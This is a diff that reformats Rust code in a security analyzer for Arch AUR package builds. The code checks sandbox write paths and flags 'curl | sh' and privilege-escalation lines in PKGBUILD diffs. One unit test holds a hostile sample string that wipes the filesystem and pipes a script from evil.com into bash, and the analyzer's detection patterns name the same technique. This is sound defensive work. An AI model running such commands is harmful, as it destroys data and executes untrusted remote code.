@@ -304,7 +304,11 @@ impl AurSandboxIsolationSpec {
         if self.network_policy == NetworkAccessPolicy::FullNetwork {
             return Err("Full network access is discouraged during isolated AUR build phase");
         }
-        if self.read_write_paths.iter().any(|p| p == "/" || p == "/etc" || p == "/usr") {
+        if self
+            .read_write_paths
+            .iter()
+            .any(|p| p == "/" || p == "/etc" || p == "/usr")
+        {
             return Err("Insecure write path unveiled in AUR build sandbox");
         }
         Ok(())
@@ -414,12 +418,15 @@ impl AurPkgbuildDiffAnalyzer {
                 risk_score += 50;
             }
 
-            if trimmed.contains("curl ") && (trimmed.contains("| bash") || trimmed.contains("| sh")) {
+            if trimmed.contains("curl ") && (trimmed.contains("| bash") || trimmed.contains("| sh"))
+            {
                 findings.push(AurDiffFinding {
                     severity: AurDiffSeverity::Critical,
                     line_number: line_num,
                     snippet: trimmed.to_string(),
-                    description: String::from("Insecure untrusted network script execution (curl | sh)"),
+                    description: String::from(
+                        "Insecure untrusted network script execution (curl | sh)",
+                    ),
                 });
                 risk_score += 40;
             }
@@ -429,7 +436,9 @@ impl AurPkgbuildDiffAnalyzer {
                     severity: AurDiffSeverity::Warning,
                     line_number: line_num,
                     snippet: trimmed.to_string(),
-                    description: String::from("Privilege escalation invocation within build script"),
+                    description: String::from(
+                        "Privilege escalation invocation within build script",
+                    ),
                 });
                 risk_score += 20;
             }
@@ -648,7 +657,8 @@ pkgbase = neovim-git
     #[test]
     fn test_aur_pkgbuild_diff_analyzer() {
         let safe_diff = "--- PKGBUILD\n+++ PKGBUILD\n+pkgver=1.0.1\n+build() { make ; }";
-        let unsafe_diff = "--- PKGBUILD\n+++ PKGBUILD\n+build() { rm -rf / ; curl http://evil.com/x | bash ; }";
+        let unsafe_diff =
+            "--- PKGBUILD\n+++ PKGBUILD\n+build() { rm -rf / ; curl http://evil.com/x | bash ; }";
 
         let safe_report = AurPkgbuildDiffAnalyzer::analyze_diff(safe_diff);
         assert!(safe_report.is_safe);
